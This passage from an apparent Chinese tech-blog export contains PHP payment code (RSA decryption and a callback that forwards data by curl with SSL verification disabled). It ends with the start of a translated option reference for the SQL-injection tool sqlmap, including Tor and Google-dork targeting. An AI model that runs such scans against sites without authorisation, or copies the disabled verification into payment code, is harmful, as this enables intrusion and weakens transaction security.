class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="variable">$data</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">true</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_CAINFO, <span class="variable">$path</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HTTPHEADER,<span class="keyword">array</span>(<span class="string">&#x27;Content-Type: application/json; charset=utf-8&#x27;</span>,<span class="string">&#x27;Content-Length:&#x27;</span> . strlen(<span class="variable">$data</span>)));</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$response</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;code&#x27;</span> =&gt; <span class="variable">$httpCode</span>, <span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$response</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * [privateKeyStr 私钥钥字符串处理]</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  [type] $privatekey [description]</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> [type]             [description]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">privateKeyStr</span>(<span class="params"><span class="variable">$privatekey</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$private_key</span> = <span class="string">&quot;-----BEGIN PRIVATE KEY-----\r\n&quot;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (str_split(<span class="variable">$privatekey</span>,<span class="number">64</span>) <span class="keyword">as</span> <span class="variable">$str</span>)&#123;</span><br><span class="line">            <span class="variable">$private_key</span> .= <span class="variable">$str</span> . <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$private_key</span> .=<span class="string">&quot;-----END PRIVATE KEY-----&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$private_key</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * [decode 私钥解密]</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  [type] $data       [待解密字符串]</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  [type] $privateKey [私钥]</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> [type]             [description]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">privateDecrypt</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$privateKey</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//读取秘钥</span></span><br><span class="line">        <span class="variable">$pr_key</span> = openssl_pkey_get_private(<span class="variable">$privateKey</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pr_key</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;打开密钥出错&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$data</span> = base64_decode(<span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$crypto</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="comment">//分段解密</span></span><br><span class="line">        <span class="keyword">foreach</span> (str_split(<span class="variable">$data</span>, <span class="number">128</span>) <span class="keyword">as</span> <span class="variable">$chunk</span>) &#123;</span><br><span class="line">            openssl_private_decrypt(<span class="variable">$chunk</span>, <span class="variable">$decryptData</span>, <span class="variable">$pr_key</span>);</span><br><span class="line">            <span class="variable">$crypto</span> .= <span class="variable">$decryptData</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$crypto</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>rechargeNotify回调核心代码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * desc: 处理线上支付无参数路由支付回调处理方法：通过url调用执行该文件，获取相关支付确认信息后，通过curl转发到带参数路由的api接口</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">define(<span class="string">&#x27;S_ROOT&#x27;</span>, dirname(<span class="keyword">__FILE__</span>) . DIRECTORY_SEPARATOR);</span><br><span class="line"><span class="comment">//require S_ROOT . &#x27;core&#x27; . DIRECTORY_SEPARATOR . &#x27;base.php&#x27;;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span>       = [];  <span class="comment">//支付回调数据</span></span><br><span class="line"><span class="variable">$payData</span>    = <span class="string">&#x27;&#x27;</span>;  <span class="comment">//支付回传的支付参数，规定：使用&quot;_&quot;将支付名称与支付ID连接起来，如兄弟支付：&#x27;xiongdi_123&#x27;</span></span><br><span class="line"><span class="variable">$payType</span>    = <span class="string">&#x27;&#x27;</span>;  <span class="comment">//支付类型</span></span><br><span class="line"><span class="variable">$payment_id</span> = <span class="string">&#x27;&#x27;</span>;  <span class="comment">//支付方式ID</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//不同的支付方式获取数据的方式可能不同，根据不同的支付，添加不同的获取回调数据的方法，如：$_GET\$_POST\$_REQUEST\（php://input）</span></span><br><span class="line"><span class="variable">$postData</span> = file_get_contents(<span class="string">&quot;php://input&quot;</span>);  <span class="comment">//获取post参数字符串类型数据</span></span><br><span class="line">payLog(<span class="string">&#x27;callbackRecharge.txt&#x27;</span>,print_r(<span class="variable">$postData</span>,<span class="literal">true</span>).<span class="string">&#x27;---23---&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//数据处理，不同的支付方式，可能数据处理方式不同</span></span><br><span class="line"><span class="keyword">if</span>  (!<span class="keyword">empty</span>(<span class="variable">$postData</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!simplexml_load_string(<span class="variable">$postData</span>, <span class="string">&#x27;SimpleXMLElement&#x27;</span>, LIBXML_NOCDATA)) &#123;</span><br><span class="line">       parse_str(<span class="variable">$postData</span>, <span class="variable">$data</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$data</span> = json_decode(json_encode(simplexml_load_string(<span class="variable">$postData</span>, <span class="string">&#x27;SimpleXMLElement&#x27;</span>, LIBXML_NOCDATA)), <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    payLog(<span class="string">&#x27;callbackRecharge.txt&#x27;</span>,print_r(<span class="variable">$postData</span>,<span class="literal">true</span>).<span class="string">&#x27;---20---&#x27;</span> . print_r(simplexml_load_string(<span class="variable">$postData</span>, <span class="string">&#x27;SimpleXMLElement&#x27;</span>, LIBXML_NOCDATA),<span class="literal">true</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$_REQUEST</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payLog(<span class="string">&#x27;callbackRecharge.txt&#x27;</span>,print_r(<span class="variable">$data</span>,<span class="literal">true</span>).<span class="string">&#x27;---26---&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">    payLog(<span class="string">&#x27;callbackRecharge.txt&#x27;</span>, <span class="string">&#x27;异步充值接参数通知数据：&#x27;</span> . print_r(<span class="variable">$data</span>, <span class="literal">true</span>));  <span class="comment">//日志，记录转接数据</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="string">&#x27;pay_attach&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$payData</span> = explode(<span class="string">&#x27;_&#x27;</span>, <span class="variable">$data</span>[<span class="string">&#x27;pay_attach&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$payData</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$payType</span>    = <span class="variable">$payData</span>[<span class="number">0</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$payment_id</span> = <span class="variable">$payData</span>[<span class="number">1</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$data</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$payment_id</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    payLog(<span class="string">&#x27;curlRecharge.log&#x27;</span>, <span class="string">&#x27;异步充值url转接参数通知数据：&#x27;</span> . print_r(<span class="variable">$data</span>, <span class="literal">true</span>));  <span class="comment">//日志，记录转接数据</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = httpPostApi(<span class="variable">$data</span>, <span class="variable">$payment_id</span>);   <span class="comment">//异步充值通知转接</span></span><br><span class="line">    payLog(<span class="string">&#x27;callbackRecharge.txt&#x27;</span>,print_r(<span class="variable">$ret</span>,<span class="literal">true</span>).<span class="string">&#x27;----73--&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ret</span>;  <span class="comment">//输出结果数据</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 充值异步转接接口调用，post数据转发，表单提交数据库格式</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $payData  需要转发的数据</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int $paymentId  线上支付方式ID</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed|number   返回数据</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">httpPostApi</span>(<span class="params"><span class="variable">$payData</span>, <span class="variable">$paymentId</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//路由api接口</span></span><br><span class="line">    <span class="variable">$payUrl</span> = <span class="string">&quot;https://&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="string">&quot;/?m=api&amp;c=recharge&amp;a=rechargeNotify&amp;payment_id=&quot;</span> . <span class="variable">$paymentId</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ch</span> = curl_init();</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_URL, <span class="variable">$payUrl</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">false</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="literal">false</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_POST, <span class="literal">true</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="literal">false</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, http_build_query(<span class="variable">$payData</span>));</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$response</span>=curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line"></span><br><span class="line">    curl_close(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$httpCode</span> == <span class="number">200</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$response</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 支付日志</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string $fileName 文件名,如：payerror.log或者pay/error.log</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  array $data 数据</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">payLog</span>(<span class="params"><span class="variable">$fileName</span>, <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$pathLog</span> = S_ROOT . <span class="string">&#x27;caches&#x27;</span> . DIRECTORY_SEPARATOR . <span class="string">&#x27;log&#x27;</span> . DIRECTORY_SEPARATOR . <span class="variable">$fileName</span>;</span><br><span class="line">    <span class="keyword">if</span> (is_file(<span class="variable">$pathLog</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (filesize(<span class="variable">$pathLog</span>) &gt;= <span class="number">10000000</span>) &#123;</span><br><span class="line">            <span class="variable">$new_file</span> = dirname(<span class="variable">$pathLog</span>) . <span class="string">&#x27;/&#x27;</span> . date(<span class="string">&#x27;Y_m_d_H_i_s&#x27;</span>).<span class="string">&#x27;_&#x27;</span>  . basename(<span class="variable">$pathLog</span>);</span><br><span class="line">            copy(<span class="variable">$pathLog</span>,<span class="variable">$new_file</span>);</span><br><span class="line">            file_put_contents(<span class="variable">$pathLog</span>, <span class="string">&#x27;&lt;----&#x27;</span> . date(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>).<span class="string">&#x27;----&gt;&#x27;</span> . <span class="variable">$data</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            file_put_contents(<span class="variable">$pathLog</span>, <span class="string">&#x27;&lt;----&#x27;</span> . date(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>).<span class="string">&#x27;----&gt;&#x27;</span> . <span class="variable">$data</span> . <span class="string">&quot;\n&quot;</span>, FILE_APPEND);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        file_put_contents(<span class="variable">$pathLog</span>, <span class="string">&#x27;&lt;----&#x27;</span> . date(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>).<span class="string">&#x27;----&gt;&#x27;</span> . <span class="variable">$data</span> . <span class="string">&quot;\n&quot;</span>, FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap基本使用</title>
    <url>/post/41891/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>SQLMap 是一个开源的渗透测试工具，可以用来进行自动化检测，利用 SQL 注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎，针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。</p>
<span id="more"></span>

<h3 id="Options（选项）"><a href="#Options（选项）" class="headerlink" title="Options（选项）"></a>Options（选项）</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Usage</span>: python sqlmap.py [<span class="keyword">options</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">Options</span>（选项）:</span><br><span class="line"></span><br><span class="line">-h, <span class="comment">--help Show basic help message and exit</span></span><br><span class="line">## 展示帮助文档 参数</span><br><span class="line"></span><br><span class="line">-hh <span class="keyword">Show</span> advanced help message <span class="keyword">and</span> <span class="keyword">exit</span></span><br><span class="line">## 展示详细帮助文档参数</span><br><span class="line"></span><br><span class="line"><span class="comment">--version Show program&#x27;s version number and exit</span></span><br><span class="line">## 显示程序的版本号</span><br><span class="line"></span><br><span class="line">-v <span class="keyword">VERBOSE</span> Verbosity <span class="keyword">level</span>: <span class="number">0</span><span class="number">-6</span> (<span class="keyword">default</span> <span class="number">1</span>)</span><br><span class="line">## 详细级别：<span class="number">0</span><span class="number">-6</span>（默认为<span class="number">1</span>）</span><br></pre></td></tr></table></figure>


<h3 id="Target（目标）"><a href="#Target（目标）" class="headerlink" title="Target（目标）"></a>Target（目标）</h3><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">Target（目标）:</span><br><span class="line"></span><br><span class="line">At least <span class="literal">one</span> <span class="keyword">of</span> these options has <span class="built_in">to</span> be provided <span class="built_in">to</span> define <span class="keyword">the</span> target(s)</span><br><span class="line"></span><br><span class="line">-d DIRECT Connection <span class="keyword">string</span> <span class="keyword">for</span> direct database connection</span><br><span class="line"><span class="comment">## 指定具体数据库</span></span><br><span class="line"></span><br><span class="line">-u <span class="built_in">URL</span>, <span class="comment">--url=URL Target URL (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;)</span></span><br><span class="line"><span class="comment">## 目标URL</span></span><br><span class="line"></span><br><span class="line">-l LOGFILE Parse target(s) <span class="built_in">from</span> Burp <span class="keyword">or</span> WebScarab proxy <span class="built_in">log</span> <span class="built_in">file</span></span><br><span class="line"><span class="comment">## 解析目标(s)从Burp或WebScarab代理日志文件</span></span><br><span class="line"></span><br><span class="line">-x SITEMAPURL Parse target(s) <span class="built_in">from</span> remote sitemap(.xml) <span class="built_in">file</span></span><br><span class="line"><span class="comment">## 解析目标(s)从远程站点地图文件(.xml)</span></span><br><span class="line"></span><br><span class="line">-m BULKFILE Scan multiple targets given <span class="keyword">in</span> <span class="keyword">a</span> textual <span class="built_in">file</span></span><br><span class="line"><span class="comment">## 扫描文本文件中给出的多个目标</span></span><br><span class="line"></span><br><span class="line">-r REQUESTFILE Load HTTP request <span class="built_in">from</span> <span class="keyword">a</span> <span class="built_in">file</span></span><br><span class="line"><span class="comment">## 从本地文件加载HTTP请求 ，多用于post注入。</span></span><br><span class="line"></span><br><span class="line">-g GOOGLEDORK Process Google dork results <span class="keyword">as</span> target URLs</span><br><span class="line"><span class="comment">## 处理Google的结果作为目标URL。</span></span><br><span class="line"></span><br><span class="line">-c CONFIGFILE Load options <span class="built_in">from</span> <span class="keyword">a</span> configuration INI <span class="built_in">file</span></span><br><span class="line"><span class="comment">## 从INI配置文件中加载选项。</span></span><br></pre></td></tr></table></figure>

<h3 id="Request（请求）"><a href="#Request（请求）" class="headerlink" title="Request（请求）"></a>Request（请求）</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Request（请求）:</span><br><span class="line">​</span><br><span class="line">These options can be used <span class="keyword">to</span> specify how <span class="keyword">to</span> connect <span class="keyword">to</span> the target URL</span><br><span class="line"><span class="comment">## 这些选项可以用来指定如何连接到目标URL。</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--method</span>=METHOD Force usage of given HTTP method (e.g. PUT)</span><br><span class="line"><span class="comment">## 强制使用给定的HTTP方法（e.g. PUT）</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--data</span>=DATA Data string <span class="keyword">to</span> be sent through POST</span><br><span class="line"><span class="comment">## 通过POST发送的数据字符串</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--param-del</span>=PARA.. Character used <span class="keyword">for</span> splitting parameter values</span><br><span class="line"><span class="comment">## 用于拆分参数值的字符</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--cookie</span>=COOKIE HTTP Cookie header value HTTP</span><br><span class="line"><span class="comment">## Cookie头的值</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--cookie-del</span>=COO.. Character used <span class="keyword">for</span> splitting cookie values</span><br><span class="line"><span class="comment">## 用于分割Cookie值的字符</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--load-cookies</span>=L.. File containing cookies <span class="keyword">in</span> Netscape/wget format</span><br><span class="line"><span class="comment">## 包含Netscape / wget格式的cookie的文件</span></span><br><span class="line"></span><br><span class="line">--drop-set-cookie Ignore Set-Cookie header <span class="keyword">from</span> response</span><br><span class="line"><span class="comment">## 从响应中忽略Set-Cookie头</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--user-agent</span>=AGENT HTTP User-Agent header value</span><br><span class="line"><span class="comment">## 指定 HTTP User - Agent头</span></span><br><span class="line"></span><br><span class="line">--random-agent Use randomly selected HTTP User-Agent header value</span><br><span class="line"><span class="comment">##  使用随机选定的HTTP User - Agent头</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--host</span>=HOST HTTP Host header value</span><br><span class="line"><span class="comment">## HTTP主机头值</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--referer</span>=REFERER HTTP Referer header value</span><br><span class="line"><span class="comment">##  指定 HTTP Referer头</span></span><br><span class="line"></span><br><span class="line">-H HEADER, --hea<span class="built_in">..</span> Extra header (e.g. <span class="string">&quot;X-Forwarded-For: 127.0.0.1&quot;</span>)</span><br><span class="line"><span class="comment">## 额外header</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--headers</span>=HEADERS Extra headers (e.g. <span class="string">&quot;Accept-Language: fr\\nETag: 123&quot;</span>)</span><br><span class="line"><span class="comment">## 额外header</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--auth-type</span>=AUTH.. HTTP authentication<span class="built_in"> type </span>(Basic, Digest, NTLM <span class="keyword">or</span> PKI)HTTP</span><br><span class="line"><span class="comment">## 认证类型(Basic, Digest, NTLM or PKI)</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--auth-cred</span>=AUTH.. HTTP authentication credentials (name:password)</span><br><span class="line"><span class="comment">##  HTTP认证凭证(name:password)</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--auth-file</span>=AUTH.. HTTP authentication PEM cert/private key file</span><br><span class="line"><span class="comment">## HTTP认证 PEM认证/私钥文件</span></span><br><span class="line"></span><br><span class="line">--ignore-401 Ignore HTTP <span class="builtin-name">Error</span> 401 (Unauthorized)</span><br><span class="line"><span class="comment">## 忽略HTTP错误401</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--proxy</span>=PROXY Use a<span class="built_in"> proxy </span><span class="keyword">to</span> connect <span class="keyword">to</span> the target URL</span><br><span class="line"><span class="comment">## 使用代理连接到目标网址</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--proxy-cred</span>=PRO..<span class="built_in"> Proxy </span>authentication credentials (name:password)</span><br><span class="line"><span class="comment">## 代理认证证书(name:password)</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--proxy-file</span>=PRO.. Load<span class="built_in"> proxy </span>list <span class="keyword">from</span> a file</span><br><span class="line"><span class="comment">## 从文件中加载代理列表</span></span><br><span class="line"></span><br><span class="line">--ignore-proxy Ignore<span class="built_in"> system default proxy settings</span></span><br><span class="line"><span class="built_in"></span><span class="comment">## 忽略系统默认代理设置</span></span><br><span class="line"></span><br><span class="line">--tor Use Tor anonymity<span class="built_in"> network</span></span><br><span class="line"><span class="built_in"></span><span class="comment">## 使用Tor匿名网络</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--tor-port</span>=TORPORT <span class="builtin-name">Set</span> Tor<span class="built_in"> proxy port </span>other than<span class="built_in"> default</span></span><br><span class="line"><span class="built_in"></span><span class="comment">##  设置Tor代理端口而不是默认值</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--tor-type</span>=TORTYPE <span class="builtin-name">Set</span> Tor<span class="built_in"> proxy type </span>(HTTP (default), SOCKS4 <span class="keyword">or</span> SOCKS5)</span><br><span class="line"><span class="comment">## 设置Tor代理类型</span></span><br><span class="line"></span><br><span class="line">--check-tor Check <span class="keyword">to</span> see <span class="keyword">if</span> Tor is used properly</span><br><span class="line"><span class="comment">## 检查Tor是否正确使用</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--delay</span>=DELAY Delay <span class="keyword">in</span> seconds between each HTTP request</span><br><span class="line"><span class="comment">## 每个HTTP请求之间的延迟（秒）</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--timeout</span>=TIMEOUT Seconds <span class="keyword">to</span> wait before timeout<span class="built_in"> connection </span>(default 30)</span><br><span class="line"><span class="comment">## 秒超时连接前等待（默认30）</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--retries</span>=RETRIES Retries when the<span class="built_in"> connection </span>timeouts (default 3)</span><br><span class="line"><span class="comment">##  连接超时时重试（默认值3）</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--randomize</span>=RPARAM Randomly change value <span class="keyword">for</span> given parameter(s)</span><br><span class="line"><span class="comment">## 随机更改给定参数的值(s)</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--safe-url</span>=SAFEURL URL<span class="built_in"> address </span><span class="keyword">to</span> visit frequently during testing</span><br><span class="line"><span class="comment">## 在测试期间频繁访问的URL地址</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--safe-post</span>=SAFE.. POST data <span class="keyword">to</span> send <span class="keyword">to</span> a safe URL</span><br><span class="line"><span class="comment">## POST数据发送到安全URL</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--safe-req</span>=SAFER.. Load safe HTTP request <span class="keyword">from</span> a file</span><br><span class="line"><span class="comment">## 从文件加载安全HTTP请求</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--safe-freq</span>=SAFE.. Test requests between two visits <span class="keyword">to</span> a given safe URL</span><br><span class="line"><span class="comment">## 在两次访问给定安全网址之间测试请求</span></span><br><span class="line"></span><br><span class="line">--skip-urlencode Skip URL encoding of payload data</span><br><span class="line"><span class="comment">## 跳过有效载荷数据的URL编码</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--csrf-token</span>=CSR.. Parameter used <span class="keyword">to</span> hold anti-CSRF token</span><br><span class="line"><span class="comment">## 参数用于保存anti-CSRF令牌</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--csrf-url</span>=CSRFURL URL<span class="built_in"> address </span><span class="keyword">to</span> visit <span class="keyword">to</span> extract anti-CSRF token</span><br><span class="line"><span class="comment">## 提取anti-CSRF URL地址访问令牌</span></span><br><span class="line"></span><br><span class="line">--force-ssl Force usage of SSL/HTTPS</span><br><span class="line"><span class="comment">## 强制使用SSL /HTTPS</span></span><br><span class="line"></span><br><span class="line">--hpp Use HTTP parameter pollution method</span><br><span class="line"><span class="comment">## 使用HTTP参数pollution的方法</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">--eval</span>=EVALCODE Evaluate provided Python code before the request (e.g. 评估请求之前提供Python代码<span class="string">&quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="Optimization（优化）"><a href="#Optimization（优化）" class="headerlink" title="Optimization（优化）"></a>Optimization（优化）</h3><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line">Optimization（优化）:</span><br><span class="line">​</span><br><span class="line">These options can be used to optimize the performance of sqlmap</span><br><span class="line"><span class="meta">## 这些选项可用于优化sqlmap的性能</span></span><br><span class="line">​</span><br><span class="line">-o Turn on all optimization switches</span><br><span class="line"><span class="meta">## 开启所有优化开关</span></span><br><span class="line">​</span><br><span class="line">--predict-output Predict common queries output</span><br><span class="line"><span class="meta">## 预测常见的查询输出</span></span><br><span class="line">​</span><br><span class="line">--keep-alive Use persistent HTTP(s) connections</span><br><span class="line"><span class="meta">## 使用持久的HTTP（S）连接</span></span><br><span class="line">​</span><br><span class="line">--<span class="literal">null</span>-connection Retrieve page length without actual HTTP response body</span><br><span class="line"><span class="meta">## 从没有实际的HTTP响应体中检索页面长度</span></span><br><span class="line">​</span><br><span class="line">--threads=THREADS Max number of concurrent HTTP(s) requests (<span class="keyword">default</span> <span class="number">1</span>)</span><br><span class="line"><span class="meta">## 最大的HTTP（S）请求并发量（默认为1）</span></span><br></pre></td></tr></table></figure>


